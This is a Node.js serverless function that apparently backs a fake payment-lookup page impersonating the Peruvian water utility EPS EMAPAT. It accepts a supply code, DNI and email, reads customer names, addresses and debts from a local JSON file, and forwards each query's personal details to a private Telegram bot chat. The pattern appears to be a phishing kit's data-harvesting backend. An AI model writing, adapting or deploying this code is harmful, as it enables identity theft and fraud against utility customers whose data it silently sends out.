const fs = require('fs');
const path = require('path');

async function sendTelegram(data) {
  const token  = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  const icono = data.encontrado ? '🔍' : '⚠️';
  const msg = [
    `${icono} *CONSULTA DE SUMINISTRO — EPS EMAPAT*`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `📋 *Suministro:* ${data.codigo}`,
    ...(data.dni ? [`🪪 *DNI:* ${data.dni}`] : []),
    ...(data.email ? [`📧 *Correo:* ${data.email}`] : []),
    data.encontrado
      ? `👤 *Cliente:* ${data.nombre || '-'}`
      : `❌ *Resultado:* No encontrado`,
    ...(data.encontrado && data.dir ? [`🏠 *Dirección:* ${data.dir}`] : []),
    `💰 *Deuda:* S/ ${Number(data.deuda || 0).toFixed(2)}`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `🕐 *Fecha:* ${data.fecha}`,
  ].join('\n');
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' }),
  });
}

function cargarDB() {
  try {
    const filePath = path.join(process.cwd(), 'pagoWEB/pagoweb_data.json');
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (e) {
    console.error('Error cargando pagoweb_data.json:', e);
    return {};
  }
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'GET') return res.status(405).json({ error: 'Método no permitido' });

  const codigo = String(req.query.codigo || '').trim();
  const dni    = String(req.query.dni || '').trim();
  const email  = String(req.query.email || '').trim();

  if (!codigo) {
    return res.status(400).json({ error: 'Ingrese un código de suministro' });
  }

  const DB = cargarDB();
  const cliente = DB[codigo];

  try {
    await sendTelegram({
      codigo,
      dni,
      email,
      encontrado: Boolean(cliente),
      nombre: cliente ? cliente.nombre : undefined,
      dir: cliente ? cliente.dir : undefined,
      deuda: cliente ? cliente.deuda : 0,
      fecha: new Date().toLocaleString('es-PE', { timeZone: 'America/Lima' }),
    });
  } catch (e) {
    console.error('Telegram error:', e);
  }

  if (!cliente) {
    return res.status(404).json({ error: 'Código de suministro no encontrado' });
  }

  return res.status(200).json(cliente);
};